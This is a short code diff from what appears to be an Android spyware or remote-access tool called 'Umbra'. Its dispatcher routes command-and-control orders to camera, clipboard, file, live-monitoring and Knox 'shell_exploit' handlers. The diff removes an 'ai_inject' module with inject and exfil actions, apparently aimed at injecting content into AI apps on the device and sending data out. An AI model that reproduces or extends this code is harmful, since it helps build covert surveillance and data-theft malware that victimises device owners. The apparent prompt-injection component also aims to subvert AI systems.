@@ -5,7 +5,6 @@ import android.provider.Settings
 import android.util.Log
 import org.umbra.core.c2.C2Coordinator
 import org.umbra.core.c2.Command
-import org.umbra.core.modules.AiInjectionModule
 import org.umbra.core.modules.CameraModule
 import org.umbra.core.modules.ClipboardModule
 import org.umbra.core.modules.FileModule
@@ -126,12 +125,6 @@ object UmbraEngine {
                 "enumerate" -> KnoxPermissionGrant.enumerateServices(cmd)
                 "shell_exploit" -> KnoxPermissionGrant.knoxShellExploit(cmd)
                 else -> UmbraResponse.ErrorResponse("knox:unknown_action:${cmd.action}", "knox")
-            }},
-            "ai_inject" to { cmd -> when (cmd.action) {
-                "inject" -> AiInjectionModule.inject(context, cmd)
-                "exfil" -> AiInjectionModule.exfil(context, cmd)
-                "status" -> AiInjectionModule.status(context, cmd)
-                else -> UmbraResponse.ErrorResponse("ai_inject:unknown_action:${cmd.action}", "ai_inject")
             }},
             "live"     to { cmd -> when (cmd.action) {
                 "start" -> LiveMonitor.start(context, cmd)
